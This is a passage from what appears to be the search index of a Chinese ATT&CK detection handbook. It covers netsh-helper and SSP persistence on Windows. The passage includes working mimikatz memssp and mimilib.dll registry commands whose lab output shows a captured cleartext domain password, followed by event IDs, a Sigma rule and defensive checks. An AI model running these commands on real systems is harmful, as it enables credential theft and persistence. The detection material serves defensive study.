medium","title":"sigma\u68c0\u6d4b\u89c4\u5219"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-007-win-%E9%80%9A%E8%BF%87netsh%20key%E6%8C%81%E4%B9%85%E5%8C%96/#_6","text":"\u6682\u65e0","title":"\u5176\u4ed6\u5efa\u8bae"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-007-win-%E9%80%9A%E8%BF%87netsh%20key%E6%8C%81%E4%B9%85%E5%8C%96/#_7","text":"MITRE-ATT&CK-T1546-007 https://attack.mitre.org/techniques/T1546/007/ Window\u6743\u9650\u7ef4\u6301\uff08\u5341\uff09\uff1aNetsh Helper DLL https://www.cnblogs.com/xiaozi/p/11834533.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/","text":"T1547-005-win-SSP\u6743\u9650\u7ef4\u6301 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 Windows SSP\uff08Windows\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8f\uff09\u52a8\u6001\u94fe\u63a5\u5e93\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u52a0\u8f7d\u5230LSA\uff08\u672c\u5730\u5b89\u5168\u673a\u6784\uff09\u8fdb\u7a0b\u4e2d\u3002\u4e00\u65e6\u52a0\u8f7d\u5230LSA\u4e2d\uff0cSSP\u52a8\u6001\u94fe\u63a5\u5e93\u53ef\u4ee5\u8bbf\u95ee\u5b58\u50a8\u5728Windows\u4e2d\u7684\u52a0\u5bc6\u548c\u660e\u6587\u5bc6\u7801\uff0c\u4f8b\u5982\u4efb\u4f55\u767b\u5f55\u7528\u6237\u7684\u57df\u5bc6\u7801\u6216\u667a\u80fd\u5361PIN\u7801\u3002SSP\u914d\u7f6e\u5b58\u50a8\u5728\u4e24\u4e2a\u6ce8\u518c\u8868\u9879\u4e2d\uff1aHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages\u548cHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\SecurityPackages\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4fee\u6539\u8fd9\u4e9b\u6ce8\u518c\u8868\u9879\u6765\u6dfb\u52a0\u65b0\u7684SSP\u3002\u8fd9\u4e9bSSP\u5c06\u5728\u4e0b\u6b21\u7cfb\u7edf\u542f\u52a8\u65f6\u52a0\u8f7d\uff0c\u6216\u8005\u5728\u8c03\u7528AddSecurityPackage Windows API\u51fd\u6570\u65f6\u52a0\u8f7d\u3002 \u6d4b\u8bd5\u6848\u4f8b SSP\uff08Security Support Provider\uff09\u662fwindows\u64cd\u4f5c\u7cfb\u7edf\u5b89\u5168\u673a\u5236\u7684\u63d0\u4f9b\u8005\u3002\u7b80\u5355\u7684\u8bf4\uff0cSSP\u5c31\u662fDLL\u6587\u4ef6\uff0c\u4e3b\u8981\u7528\u4e8ewindows\u64cd\u4f5c\u7cfb\u7edf\u7684\u8eab\u4efd\u8ba4\u8bc1\u529f\u80fd\uff0c\u4f8b\u5982NTLM\u3001Kerberos\u3001Negotiate\u3001Secure Channel\uff08Schannel\uff09\u3001Digest\u3001Credential\uff08CredSSP\uff09\u3002 SSPI\uff08Security Support Provider Interface\uff0c\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8f\u63a5\u53e3\uff09\u662fwindows\u64cd\u4f5c\u7cfb\u7edf\u5728\u6267\u884c\u8ba4\u8bc1\u64cd\u4f5c\u65f6\u4f7f\u7528\u7684API\u63a5\u53e3\u3002\u53ef\u4ee5\u8bf4SSPI\u5c31\u662fSSP\u7684API\u63a5\u53e3\u3002 \u5982\u679c\u83b7\u5f97\u76ee\u6807\u7cfb\u7edfsystem\u6743\u9650\uff0c\u53ef\u4ee5\u4f7f\u7528\u8be5\u65b9\u6cd5\u8fdb\u884c\u6301\u4e45\u5316\u64cd\u4f5c\u3002\u5176\u4e3b\u8981\u539f\u7406\u662f\uff1aLSA\uff08Local Security Authority\uff09\u7528\u4e8e\u8eab\u4efd\u9a8c\u8bc1\uff1blsass.exe\u4f5c\u4e3awindows\u7684\u7cfb\u7edf\u8fdb\u7a0b\uff0c\u7528\u4e8e\u672c\u5730\u5b89\u5168\u548c\u767b\u5f55\u7b56\u7565\uff1b\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\uff0cSSP\u5c06\u88ab\u52a0\u8f7d\u5230lsass.exe \u8fdb\u7a0b\u4e2d\u3002\u4f46\u662f\uff0c\u5047\u5982\u653b\u51fb\u8005\u5bf9LSA\u8fdb\u884c\u4e86\u6269\u5c55\uff0c\u81ea\u5b9a\u4e49\u4e86\u6076\u610f\u7684DLL\u6587\u4ef6\uff0c\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u5c06\u5176\u52a0\u8f7d\u5230lsass.exe\u8fdb\u7a0b\u4e2d\uff0c\u5c31\u80fd\u591f\u83b7\u53d6lsass.exe\u8fdb\u7a0b\u4e2d\u7684\u660e\u6587\u5bc6\u7801\u3002\u8fd9\u6837\u5373\u4f7f\u7528\u6237\u66f4\u6539\u5bc6\u7801\u5e76\u91cd\u65b0\u767b\u5f55\uff0c\u653b\u51fb\u8005\u4f9d\u7136\u53ef\u4ee5\u83b7\u5f97\u8be5\u8d26\u53f7\u7684\u65b0\u5bc6\u7801\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows\u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u65b9\u6cd5\u4e00 \u4f7f\u7528mimikatz\u5c06\u4f2a\u9020\u7684SSP\u6ce8\u5165\u5185\u5b58\uff0c\u8fd9\u6837\u505a\u4e0d\u4f1a\u5728\u7cfb\u7edf\u4e2d\u7559\u4e0b\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4f46\u5982\u679c\u57df\u63a7\u5236\u5668\u91cd\u542f\uff0c\u88ab\u6ce8\u5165\u5185\u5b58\u7684\u4f2a\u9020\u7684SSP\u5c06\u4f1a\u4e22\u5931\u3002 mimikatz.exe \"privilege::debug\" \"misc::memssp\" exit C:\\Users\\Administrator\\Desktop\\mimikatz_trunk\\x64>mimikatz.exe \"privilege::debug \" \"misc::memssp\" exit .#####. mimikatz 2.1.1 (x64) built on Apr 9 2017 23:24:20 .## ^ ##. \"A La Vie, A L'Amour\" ## / \\ ## /* * * ## \\ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) '## v ##' http://blog.gentilkiwi.com/mimikatz (oe.eo) '#####' with 21 modules * * */ mimikatz(commandline) # privilege::debug Privilege '20' OK mimikatz(commandline) # misc::memssp Injected =) mimikatz(commandline) # exit Bye! \u6ce8\u9500\u5f53\u524d\u7528\u6237\u91cd\u65b0\u767b\u5f55\uff0c\u5373\u53ef\u83b7\u53d6\u660e\u6587\u5bc6\u7801\uff0c\u5bc6\u7801\u5b58\u50a8\u5728\u65e5\u5fd7\u6587\u4ef6C:\\Windows\\system32\\mimilsa.log\u4e2d\u3002 type C:\\Windows\\system32\\mimilsa.log C:\\Users\\Administrator>type C:\\Windows\\system32\\mimilsa.log [00000000:00063a51] DC\\Administrator admin.098 \u65b9\u6cd5\u4e8c \u5c06mimikatz\u4e2d\u7684mimilib.dll \u653e\u5230\u7cfb\u7edf\u7684C:\\Windows\\system32\u76ee\u5f55\u4e0b\uff08DLL\u7684\u4f4d\u6570\u9700\u8981\u4e0ewindows\u4f4d\u6570\u76f8\u540c\uff09\uff0c\u5e76\u5c06mimilib.dll\u6dfb\u52a0\u5230\u6ce8\u518c\u8868\u4e2d\uff0c\u4f7f\u7528\u6b64\u65b9\u6cd5\u5373\u4f7f\u7cfb\u7edf\u91cd\u542f\uff0c\u4e5f\u4e0d\u4f1a\u5f71\u54cd\u5230\u6301\u4e45\u5316\u7684\u6548\u679c\u3002 copy mimilib.dll %systemroot%\\system32 reg query hklm\\system\\currentcontrolset\\control\\lsa\\ /v \"Security Packages\" reg add \"hklm\\system\\currentcontrolset\\control\\lsa\\\" /v \"Security Packages\" /d \"kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib\" /t REG_MULTI_SZ C:\\Users\\Administrator\\Desktop\\mimikatz_trunk\\x64>copy mimilib.dll %systemroot%\\ system32 \u5df2\u590d\u5236 1 \u4e2a\u6587\u4ef6\u3002 C:\\Users\\Administrator\\Desktop\\mimikatz_trunk\\x64>reg query hklm\\system\\currentc ontrolset\\control\\lsa\\ /v \"Security Packages\" HKEY_LOCAL_MACHINE\\system\\currentcontrolset\\control\\lsa Security Packages REG_MULTI_SZ kerberos\\0msv1_0\\0schannel\\0wdigest\\0ts pkg\\0pku2u \u6ce8\u610f\uff1a\u6700\u540e\u4e00\u6b65\u4fee\u6539\u6ce8\u518c\u8868\u9700\u8981\u5728powershell\u547d\u4ee4\u884c\u4e0b\u64cd\u4f5c\uff0ccmd\u4e0b\u53ef\u80fd\u4f1a\u62a5\u9519\u3002 C:\\Users\\Administrator\\Desktop\\mimikatz_trunk\\x64>reg add \"hklm\\system\\currentcontrolset\\control\\lsa\\\" /v \"Security Packages\" /d \"kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib\" /t REG_MULTI_SZ \u9519\u8bef: \u65e0\u6548\u8bed\u6cd5\u3002 \u952e\u5165 \"REG ADD /?\" \u4e86\u89e3\u7528\u6cd5\u4fe1\u606f\u3002 PS C:\\Users\\Administrator> reg add \"hklm\\system\\currentcontrolset\\control\\lsa\\\" /v \"Security Packages\" /d \"kerberos\\0msv 1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib\" /t REG_MULTI_SZ \u503c Security Packages \u5df2\u5b58\u5728\uff0c\u8981\u8986\u76d6\u5417(Yes/No)? y \u64cd\u4f5c\u6210\u529f\u5b8c\u6210\u3002 \u67e5\u770b\u6ce8\u518c\u8868 hklm\\system\\currentcontrolset\\control\\lsa\\Security Packages\u9879\u7684\u503c\u3002 C:\\Users\\Administrator\\Desktop\\mimikatz_trunk\\x64>reg query hklm\\system\\currentc ontrolset\\control\\lsa\\ /v \"Security Packages\" HKEY_LOCAL_MACHINE\\system\\currentcontrolset\\control\\lsa Security Packages REG_MULTI_SZ kerberos\\0msv1_0\\0schannel\\0wdigest\\0ts pkg\\0pku2u\\0mimilib \u7cfb\u7edf\u91cd\u542f\u540e\uff0c\u82e5dll\u88ab\u6210\u529f\u52a0\u8f7d\uff0c\u7528\u6237\u5728\u767b\u5f55\u65f6\u8f93\u5165\u7684\u8d26\u53f7\u548c\u5bc6\u7801\u660e\u6587\u5c31\u4f1a\u88ab\u8bb0\u5f55\u5728C:\\Windows\\system32\\kiwissp.log\u4e2d\u3002 type C:\\Windows\\system32\\kiwissp.log C:\\Users\\Administrator>type C:\\Windows\\system32\\kiwissp.log [00000000:000003e7] [00000002] WORKGROUP\\DC$ (DC$) [00000000:00049cd0] [00000002] DC\\Administrator (Administrator) admin.098 [00000000:000003e5] [00000005] \\ (LOCAL SERVICE) \u6d4b\u8bd5\u7559\u75d5 \u5efa\u8bae\u5728windows server 2008\uff08\u542b2008\uff09\u4ee5\u4e0b\u7248\u672c\u5b89\u88c5\u90e8\u7f72sysmon\uff0c\u8bb0\u5f55\u8fdb\u7a0b\u540d\u79f0\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u65b9\u4fbf\u6eaf\u6e90\u5206\u6790\uff1b \u5efa\u8bae\u5728windows server 2008\u4ee5\u4e0a\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5f00\u542f\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa\u7b56\u7565\uff0c\u8bb0\u5f55\u8fdb\u7a0b\u540d\u79f0\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u65b9\u4fbf\u6eaf\u6e90\u5206\u6790\u3002 #\u9488\u5bf9\u65b9\u6cd5\u4e8c\u7559\u75d5 EVentID: 4656 #\u5df2\u8bf7\u6c42\u5230\u5bf9\u8c61\u7684\u53e5\u67c4\u3002 \u5bf9\u8c61: \u5bf9\u8c61\u670d\u52a1\u5668: Security \u5bf9\u8c61\u7c7b\u578b: Key \u5bf9\u8c61\u540d: \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN \u53e5\u67c4 ID: 0x508 \u8fdb\u7a0b\u4fe1\u606f: \u8fdb\u7a0b ID: 0x748 \u8fdb\u7a0b\u540d: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \u8bbf\u95ee\u8bf7\u6c42\u4fe1\u606f: \u4e8b\u52a1 ID: {00000000-0000-0000-0000-000000000000} \u8bbf\u95ee: READ_CONTROL \u67e5\u8be2\u9879\u503c \u679a\u4e3e\u5b50\u9879 \u5bf9\u9879\u7684\u6539\u52a8\u8fdb\u884c\u901a\u77e5 EVentID: 4658 #\u5df2\u5173\u95ed\u5230\u5bf9\u8c61\u7684\u53e5\u67c4\u3002 \u5bf9\u8c61: \u5bf9\u8c61\u670d\u52a1\u5668: Security \u53e5\u67c4 ID: 0x508 \u8fdb\u7a0b\u4fe1\u606f: \u8fdb\u7a0b ID: 0xbd8 \u8fdb\u7a0b\u540d: C:\\Windows\\System32\\Oobe.exe EVentID: 4688 #\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002\u5728\u9ad8\u7248\u672c\u7cfb\u7edf\u4e2d\u53ef\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x5c8 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\reg.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: TokenElevationTypeDefault (1) EVentID: 4656 #\u5df2\u8bf7\u6c42\u5230\u5bf9\u8c61\u7684\u53e5\u67c4\u3002 \u5bf9\u8c61: \u5bf9\u8c61\u670d\u52a1\u5668: Security \u5bf9\u8c61\u7c7b\u578b: Key \u5bf9\u8c61\u540d: \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN\\Plugin\\Microsoft.ServerManager \u53e5\u67c4 ID: 0x694 \u8fdb\u7a0b\u4fe1\u606f: \u8fdb\u7a0b ID: 0x864 \u8fdb\u7a0b\u540d: C:\\Windows\\System32\\Oobe.exe \u8bbf\u95ee\u8bf7\u6c42\u4fe1\u606f: \u4e8b\u52a1 ID: {00000000-0000-0000-0000-000000000000} \u8bbf\u95ee: READ_CONTROL \u67e5\u8be2\u9879\u503c \u679a\u4e3e\u5b50\u9879 \u5bf9\u9879\u7684\u6539\u52a8\u8fdb\u884c\u901a\u77e5 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Sigma\u89c4\u5219 title: \u6dfb\u52a0\u5230LSA\u914d\u7f6e\u7684\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8f\uff08SSP\uff09 status: \u6d4b\u8bd5\u9636\u6bb5 description: \u68c0\u6d4b\u5411\u6ce8\u518c\u8868\u6dfb\u52a0SSP\u3002\u5728\u91cd\u65b0\u542f\u52a8\u6216API\u8c03\u7528\u540e\uff0cSSP DLL\u53ef\u4ee5\u8bbf\u95ee\u5b58\u50a8\u5728Windows\u4e2d\u7684\u52a0\u5bc6\u5bc6\u7801\u548c\u660e\u6587\u5bc6\u7801\u3002 references: - https://attack.mitre.org/techniques/T1547/005/ - https://powersploit.readthedocs.io/en/latest/Persistence/Install-SSP/ tags: - attack.persistence - attack.t1547 logsource: product: windows service: sysmon detection: selection_registry: EventID: 13 #\u521b\u5efa\u6ce8\u518c\u8868\u503c sysmon\u65e5\u5fd7 TargetObject: - 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\Security Packages' - 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages' exclusion_images: - Image: C:\\Windows\\system32\\msiexec.exe - Image: C:\\Windows\\syswow64\\MsiExec.exe condition: selection_registry and not exclusion_images falsepositives: - \u4e0d\u592a\u53ef\u80fd level: \u5173\u952e \u5efa\u8bae \u76d1\u63a7\u6ce8\u518c\u8868\u6765\u67e5\u770bSSP\u6ce8\u518c\u8868\u9879\u662f\u5426\u6709\u66f4\u6539\u3002\u76d1\u63a7LSA\u8fdb\u7a0b\u6765\u67e5\u770b\u662f\u5426\u6709\u52a8\u6001\u94fe\u63a5\u5e93\u52a0\u8f7d\u7684\u60c5\u51b5\u3002Windows 8.1\u548cWindows Server 2012 R2\u4e2d\uff0c\u5728\u6ce8\u518c\u8868\u9879HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File ExecutionOptions\\LSASS.exe\u4e2d\u8bbe\u7f6eAuditLevel\u00df=8\u6765\u52a0\u8f7d\u672a\u7b7e\u540d\u7684SSP\u52a8\u6001\u94fe\u63a5\u5e93\u5230LSA\u65f6\u4f1a\u751f\u6210\u4e8b\u4ef6\u3002 \u5b89\u5168\u9632\u5fa1\u63aa\u65bd 1.\u68c0\u67e5\u6ce8\u518c\u8868 hklm\\system\\currentcontrolset\\control\\lsa\\Security Packages\u4f4d\u7f6e\u662f\u5426\u5b58\u5728\u53ef\u7591dll\u3002 2.\u68c0\u6d4b%windir%\\System32\u662f\u5426\u6709\u53ef\u7591dll 3.\u4f7f\u7528\u7b2c\u4e09\u65b9\u5de5\u5177 Autoruns \u68c0\u6d4bLSA\u4e2d\u662f\u5426\u5b58\u5728\u53ef\u7591dll\u3002 Autoruns\u4e0b\u8f7d\uff1a https://docs.microsoft.com/zh-cn/sysinternals/downloads/autoruns \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1547-005 https://attack.mitre.org/techniques/T1547/005/ AD\u57dfSSP\u6743\u9650\u7ef4\u6301\u4e0e\u5b89\u5168\u9632\u62a4 https://xz.aliyun.com/t/7432","title":"T1547-005-win-SSP\u6743\u9650\u7ef4\u6301"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#t1547-005-win-ssp","text":"","title":"T1547-005-win-SSP\u6743\u9650\u7ef4\u6301"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#attck","text":"Windows SSP\uff08Windows\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8f\uff09\u52a8\u6001\u94fe\u63a5\u5e93\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u52a0\u8f7d\u5230LSA\uff08\u672c\u5730\u5b89\u5168\u673a\u6784\uff09\u8fdb\u7a0b\u4e2d\u3002\u4e00\u65e6\u52a0\u8f7d\u5230LSA\u4e2d\uff0cSSP\u52a8\u6001\u94fe\u63a5\u5e93\u53ef\u4ee5\u8bbf\u95ee\u5b58\u50a8\u5728Windows\u4e2d\u7684\u52a0\u5bc6\u548c\u660e\u6587\u5bc6\u7801\uff0c\u4f8b\u5982\u4efb\u4f55\u767b\u5f55\u7528\u6237\u7684\u57df\u5bc6\u7801\u6216\u667a\u80fd\u5361PIN\u7801\u3002SSP\u914d\u7f6e\u5b58\u50a8\u5728\u4e24\u4e2a\u6ce8\u518c\u8868\u9879\u4e2d\uff1aHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages\u548cHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\SecurityPackages\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4fee\u6539\u8fd9\u4e9b\u6ce8\u518c\u8868\u9879\u6765\u6dfb\u52a0\u65b0\u7684SSP\u3002\u8fd9\u4e9bSSP\u5c06\u5728\u4e0b\u6b21\u7cfb\u7edf\u542f\u52a8\u65f6\u52a0\u8f7d\uff0c\u6216\u8005\u5728\u8c03\u7528AddSecurityPackage Windows API\u51fd\u6570\u65f6\u52a0\u8f7d\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_1","text":"SSP\uff08Security Support Provider\uff09\u662fwindows\u64cd\u4f5c\u7cfb\u7edf\u5b89\u5168\u673a\u5236\u7684\u63d0\u4f9b\u8005\u3002\u7b80\u5355\u7684\u8bf4\uff0cSSP\u5c31\u662fDLL\u6587\u4ef6\uff0c\u4e3b\u8981\u7528\u4e8ewindows\u64cd\u4f5c\u7cfb\u7edf\u7684\u8eab\u4efd\u8ba4\u8bc1\u529f\u80fd\uff0c\u4f8b\u5982NTLM\u3001Kerberos\u3001Negotiate\u3001Secure Channel\uff08Schannel\uff09\u3001Digest\u3001Credential\uff08CredSSP\uff09\u3002 SSPI\uff08Security Support Provider Interface\uff0c\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8f\u63a5\u53e3\uff09\u662fwindows\u64cd\u4f5c\u7cfb\u7edf\u5728\u6267\u884c\u8ba4\u8bc1\u64cd\u4f5c\u65f6\u4f7f\u7528\u7684API\u63a5\u53e3\u3002\u53ef\u4ee5\u8bf4SSPI\u5c31\u662fSSP\u7684API\u63a5\u53e3\u3002 \u5982\u679c\u83b7\u5f97\u76ee\u6807\u7cfb\u7edfsystem\u6743\u9650\uff0c\u53ef\u4ee5\u4f7f\u7528\u8be5\u65b9\u6cd5\u8fdb\u884c\u6301\u4e45\u5316\u64cd\u4f5c\u3002\u5176\u4e3b\u8981\u539f\u7406\u662f\uff1aLSA\uff08Local Security Authority\uff09\u7528\u4e8e\u8eab\u4efd\u9a8c\u8bc1\uff1blsass.exe\u4f5c\u4e3awindows\u7684\u7cfb\u7edf\u8fdb\u7a0b\uff0c\u7528\u4e8e\u672c\u5730\u5b89\u5168\u548c\u767b\u5f55\u7b56\u7565\uff1b\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\uff0cSSP\u5c06\u88ab\u52a0\u8f7d\u5230lsass.exe \u8fdb\u7a0b\u4e2d\u3002\u4f46\u662f\uff0c\u5047\u5982\u653b\u51fb\u8005\u5bf9LSA\u8fdb\u884c\u4e86\u6269\u5c55\uff0c\u81ea\u5b9a\u4e49\u4e86\u6076\u610f\u7684DLL\u6587\u4ef6\uff0c\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u5c06\u5176\u52a0\u8f7d\u5230lsass.exe\u8fdb\u7a0b\u4e2d\uff0c\u5c31\u80fd\u591f\u83b7\u53d6lsass.exe\u8fdb\u7a0b\u4e2d\u7684\u660e\u6587\u5bc6\u7801\u3002\u8fd9\u6837\u5373\u4f7f\u7528\u6237\u66f4\u6539\u5bc6\u7801\u5e76\u91cd\u65b0\u767b\u5f55\uff0c\u653b\u51fb\u8005\u4f9d\u7136\u53ef\u4ee5\u83b7\u5f97\u8be5\u8d26\u53f7\u7684\u65b0\u5bc6\u7801\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_2","text":"windows\u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_4","text":"\u4f7f\u7528mimikatz\u5c06\u4f2a\u9020\u7684SSP\u6ce8\u5165\u5185\u5b58\uff0c\u8fd9\u6837\u505a\u4e0d\u4f1a\u5728\u7cfb\u7edf\u4e2d\u7559\u4e0b\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4f46\u5982\u679c\u57df\u63a7\u5236\u5668\u91cd\u542f\uff0c\u88ab\u6ce8\u5165\u5185\u5b58\u7684\u4f2a\u9020\u7684SSP\u5c06\u4f1a\u4e22\u5931\u3002 mimikatz.exe \"privilege::debug\" \"misc::memssp\" exit C:\\Users\\Administrator\\Desktop\\mimikatz_trunk\\x64>mimikatz.exe \"privilege::debug \" \"misc::memssp\" exit .#####. mimikatz 2.1.1 (x64) built on Apr 9 2017 23:24:20 .## ^ ##. \"A La Vie, A L'Amour\" ## / \\ ## /* * * ## \\ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) '## v ##' http://blog.gentilkiwi.com/mimikatz (oe.eo) '#####' with 21 modules * * */ mimikatz(commandline) # privilege::debug Privilege '20' OK mimikatz(commandline) # misc::memssp Injected =) mimikatz(commandline) # exit Bye! \u6ce8\u9500\u5f53\u524d\u7528\u6237\u91cd\u65b0\u767b\u5f55\uff0c\u5373\u53ef\u83b7\u53d6\u660e\u6587\u5bc6\u7801\uff0c\u5bc6\u7801\u5b58\u50a8\u5728\u65e5\u5fd7\u6587\u4ef6C:\\Windows\\system32\\mimilsa.log\u4e2d\u3002 type C:\\Windows\\system32\\mimilsa.log C:\\Users\\Administrator>type C:\\Windows\\system32\\mimilsa.log [00000000:00063a51] DC\\Administrator admin.098","title":"\u65b9\u6cd5\u4e00"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_5","text":"\u5c06mimikatz\u4e2d\u7684mimilib.dll \u653e\u5230\u7cfb\u7edf\u7684C:\\Windows\\system32\u76ee\u5f55\u4e0b\uff08DLL\u7684\u4f4d\u6570\u9700\u8981\u4e0ewindows\u4f4d\u6570\u76f8\u540c\uff09\uff0c\u5e76\u5c06mimilib.dll\u6dfb\u52a0\u5230\u6ce8\u518c\u8868\u4e2d\uff0c\u4f7f\u7528\u6b64\u65b9\u6cd5\u5373\u4f7f\u7cfb\u7edf\u91cd\u542f\uff0c\u4e5f\u4e0d\u4f1a\u5f71\u54cd\u5230\u6301\u4e45\u5316\u7684\u6548\u679c\u3002 copy mimilib.dll %systemroot%\\system32 reg query hklm\\system\\currentcontrolset\\control\\lsa\\ /v \"Security Packages\" reg add \"hklm\\system\\currentcontrolset\\control\\lsa\\\" /v \"Security Packages\" /d \"kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib\" /t REG_MULTI_SZ C:\\Users\\Administrator\\Desktop\\mimikatz_trunk\\x64>copy mimilib.dll %systemroot%\\ system32 \u5df2\u590d\u5236 1 \u4e2a\u6587\u4ef6\u3002 C:\\Users\\Administrator\\Desktop\\mimikatz_trunk\\x64>reg query hklm\\system\\currentc ontrolset\\control\\lsa\\ /v \"Security Packages\" HKEY_LOCAL_MACHINE\\system\\currentcontrolset\\control\\lsa Security Packages REG_MULTI_SZ kerberos\\0msv1_0\\0schannel\\0wdigest\\0ts pkg\\0pku2u \u6ce8\u610f\uff1a\u6700\u540e\u4e00\u6b65\u4fee\u6539\u6ce8\u518c\u8868\u9700\u8981\u5728powershell\u547d\u4ee4\u884c\u4e0b\u64cd\u4f5c\uff0ccmd\u4e0b\u53ef\u80fd\u4f1a\u62a5\u9519\u3002 C:\\Users\\Administrator\\Desktop\\mimikatz_trunk\\x64>reg add \"hklm\\system\\currentcontrolset\\control\\lsa\\\" /v \"Security Packages\" /d \"kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib\" /t REG_MULTI_SZ \u9519\u8bef: \u65e0\u6548\u8bed\u6cd5\u3002 \u952e\u5165 \"REG ADD /?\" \u4e86\u89e3\u7528\u6cd5\u4fe1\u606f\u3002 PS C:\\Users\\Administrator> reg add \"hklm\\system\\currentcontrolset\\control\\lsa\\\" /v \"Security Packages\" /d \"kerberos\\0msv 1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib\" /t REG_MULTI_SZ \u503c Security Packages \u5df2\u5b58\u5728\uff0c\u8981\u8986\u76d6\u5417(Yes/No)? y \u64cd\u4f5c\u6210\u529f\u5b8c\u6210\u3002 \u67e5\u770b\u6ce8\u518c\u8868 hklm\\system\\currentcontrolset\\control\\lsa\\Security Packages\u9879\u7684\u503c\u3002 C:\\Users\\Administrator\\Desktop\\mimikatz_trunk\\x64>reg query hklm\\system\\currentc ontrolset\\control\\lsa\\ /v \"Security Packages\" HKEY_LOCAL_MACHINE\\system\\currentcontrolset\\control\\lsa Security Packages REG_MULTI_SZ kerberos\\0msv1_0\\0schannel\\0wdigest\\0ts pkg\\0pku2u\\0mimilib \u7cfb\u7edf\u91cd\u542f\u540e\uff0c\u82e5dll\u88ab\u6210\u529f\u52a0\u8f7d\uff0c\u7528\u6237\u5728\u767b\u5f55\u65f6\u8f93\u5165\u7684\u8d26\u53f7\u548c\u5bc6\u7801\u660e\u6587\u5c31\u4f1a\u88ab\u8bb0\u5f55\u5728C:\\Windows\\system32\\kiwissp.log\u4e2d\u3002 type C:\\Windows\\system32\\kiwissp.log C:\\Users\\Administrator>type C:\\Windows\\system32\\kiwissp.log [00000000:000003e7] [00000002] WORKGROUP\\DC$ (DC$) [00000000:00049cd0] [00000002] DC\\Administrator (Administrator) admin.098 